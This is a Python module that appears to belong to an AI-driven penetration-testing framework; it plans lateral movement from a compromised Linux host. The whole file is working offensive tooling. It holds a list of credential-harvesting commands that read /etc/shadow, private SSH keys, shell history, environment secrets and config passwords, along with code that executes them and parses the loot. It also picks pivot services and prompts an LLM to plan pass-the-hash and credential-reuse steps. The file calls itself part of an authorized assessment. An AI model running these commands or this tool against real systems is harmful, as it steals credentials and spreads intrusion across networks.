"""
Lateral Movement Planner (Phase 3, Module 2)

Plans lateral movement from a compromised host:
  - Harvest credentials (shadow, SSH keys, config files, env)
  - Map the internal network
  - Identify pivot points
  - Plan a multi-target attack path

Credential harvesting reads sensitive files, so it only runs actively when a
`runner` is supplied and tier is SHALLOW/DEEP. Otherwise it plans from data
already in SharedContext (harvested_creds, ports, subdomains).
"""

import logging
import re
from typing import Awaitable, Callable, Dict, List, Optional
from dataclasses import dataclass, field

from agents.llm_client import LLMClient, TaskTier

logger = logging.getLogger(__name__)

# Read commands that reveal credentials / reusable secrets on a *.nix host.
CRED_HARVEST_COMMANDS = {
    "shadow":   "cat /etc/shadow 2>/dev/null",
    "passwd":   "cat /etc/passwd 2>/dev/null",
    "ssh_keys": "find / -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' 2>/dev/null | head -20",
    "ssh_cfg":  "cat ~/.ssh/config /etc/ssh/ssh_config 2>/dev/null",
    "history":  "cat ~/.bash_history ~/.zsh_history 2>/dev/null | tail -50",
    "env":      "env 2>/dev/null | grep -iE 'pass|key|token|secret|api' ",
    "configs":  "grep -rniE 'password|api[_-]?key|secret|token' /var/www /opt /etc 2>/dev/null | head -30",
    "arp":      "arp -a 2>/dev/null; ip neigh 2>/dev/null",
    "netstat":  "netstat -tunap 2>/dev/null || ss -tunap 2>/dev/null",
}

CmdRunner = Callable[[str], Awaitable[str]]


@dataclass
class Credential:
    cred_type: str          # password_hash | ssh_key | plaintext | token
    username: str = ""
    secret: str = ""
    source: str = ""
    host: str = ""

    def to_dict(self) -> Dict:
        return {"type": self.cred_type, "username": self.username,
                "secret": self.secret[:120], "source": self.source, "host": self.host}


@dataclass
class PivotPoint:
    host: str
    reason: str
    services: List[str] = field(default_factory=list)
    reachable_from: str = ""
    confidence: float = 0.5

    def to_dict(self) -> Dict:
        return {"host": self.host, "reason": self.reason, "services": self.services,
                "reachable_from": self.reachable_from, "confidence": self.confidence}


class LateralMovementPlanner:
    """Harvests creds, maps the internal network, and plans pivots."""

    def __init__(self, ctx, tier: str = "POC"):
        self.ctx = ctx
        self.llm = LLMClient.get()
        self.tier = (tier or "POC").upper()
        self.credentials: List[Credential] = []
        self.pivots: List[PivotPoint] = []
        self.internal_hosts: List[str] = []

    def harvest_plan(self) -> Dict[str, str]:
        return dict(CRED_HARVEST_COMMANDS)

    async def harvest_credentials(self, host: str = "target",
                                  runner: Optional[CmdRunner] = None) -> List[Credential]:
        """Collect reusable credentials. Active harvest needs runner + tier."""
        creds: List[Credential] = []

        # From already-collected context secrets
        for s in getattr(self.ctx, "secrets", []) or []:
            creds.append(Credential(
                cred_type=s.get("type", "token"), secret=str(s.get("value", "")),
                source=s.get("source", "recon"), host=host,
            ))

        if runner and self.tier in ("SHALLOW", "DEEP"):
            for name, cmd in CRED_HARVEST_COMMANDS.items():
                try:
                    out = (await runner(cmd)) or ""
                except Exception as e:      # noqa: BLE001
                    logger.debug(f"[Lateral] harvest '{name}' failed: {e}")
                    continue
                creds += self._parse_creds(name, out, host)

        # Dedup
        seen, deduped = set(), []
        for c in creds:
            key = (c.username, c.secret)
            if any(key) and key not in seen:
                seen.add(key)
                deduped.append(c)
        self.credentials = deduped
        if deduped:
            self.ctx.add_credentials([c.to_dict() for c in deduped], source=f"lateral:{host}")
        logger.info(f"[Lateral] Harvested {len(deduped)} credential(s) from {host}")
        return deduped

    def _parse_creds(self, source: str, text: str, host: str) -> List[Credential]:
        out = []
        if source == "shadow":
            for line in text.splitlines():
                parts = line.split(":")
                if len(parts) > 1 and parts[1] and parts[1] not in ("*", "!", "!!", "x"):
                    out.append(Credential("password_hash", parts[0], parts[1], "/etc/shadow", host))
        elif source == "ssh_keys":
            for line in text.splitlines():
                if line.strip():
                    out.append(Credential("ssh_key", "", line.strip(), line.strip(), host))
        else:
            for m in re.finditer(r"(?i)(pass(?:word)?|api[_-]?key|secret|token)\s*[=:]\s*(\S+)", text):
                out.append(Credential("plaintext", "", f"{m.group(1)}={m.group(2)}", source, host))
        return out

    def map_internal_network(self) -> List[str]:
        """Derive candidate internal hosts from recon data."""
        hosts = set(self.ctx.subdomains or [])
        hosts.update(self.ctx.ips or [])
        for h in self.ctx.ports.keys():
            hosts.add(h)
        # Private-range IPs are especially interesting for pivoting
        internal = [h for h in hosts if re.match(r"^(10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.)", str(h))]
        self.internal_hosts = sorted(hosts)
        return sorted(internal) or self.internal_hosts

    def identify_pivots(self) -> List[PivotPoint]:
        """Hosts with services worth pivoting through."""
        pivots = []
        interesting = {"22": "SSH", "3389": "RDP", "445": "SMB", "5432": "PostgreSQL",
                       "3306": "MySQL", "6379": "Redis", "27017": "MongoDB", "1433": "MSSQL"}
        for host, plist in (self.ctx.ports or {}).items():
            svcs = []
            for p in plist:
                pn = str(p.get("port"))
                if pn in interesting:
                    svcs.append(f"{interesting[pn]}({pn})")
            if svcs:
                pivots.append(PivotPoint(
                    host=host, reason="Runs services usable for lateral movement",
                    services=svcs, reachable_from=self.ctx.target, confidence=0.6,
                ))
        self.pivots = pivots
        return pivots

    async def plan(self, host: str = "target",
                   runner: Optional[CmdRunner] = None) -> Dict:
        """Full lateral-movement plan."""
        await self.harvest_credentials(host, runner)
        internal = self.map_internal_network()
        pivots = self.identify_pivots()

        prompt = f"""You are the lateral-movement planning module of an AUTHORIZED
security assessment. Given a foothold on {host}, plan movement to other hosts.

HARVESTED CREDENTIALS: {len(self.credentials)} (types: {sorted({c.cred_type for c in self.credentials})})
INTERNAL HOSTS: {internal[:20]}
PIVOT CANDIDATES: {[p.to_dict() for p in pivots][:10]}

Produce a prioritized multi-target movement plan. Return JSON:
{{
  "steps": [
    {{"order": 1, "target_host": "...", "technique": "ssh_key_reuse|pass_the_hash|cred_reuse|service_exploit",
      "using": "which credential/pivot", "goal": "what it achieves", "mitre_id": "T1021"}}
  ],
  "summary": "overall lateral movement strategy"
}}"""
        res = await self.llm.generate_json(prompt, tier=TaskTier.LARGE) or {}

        plan = {
            "host": host,
            "credentials": [c.to_dict() for c in self.credentials],
            "internal_hosts": internal,
            "pivots": [p.to_dict() for p in pivots],
            "steps": res.get("steps", []),
            "summary": res.get("summary", ""),
        }
        self.ctx.lateral_plan = plan
        logger.info(f"[Lateral] Plan: {len(plan['steps'])} steps, "
                    f"{len(pivots)} pivots, {len(internal)} internal hosts")
        return plan
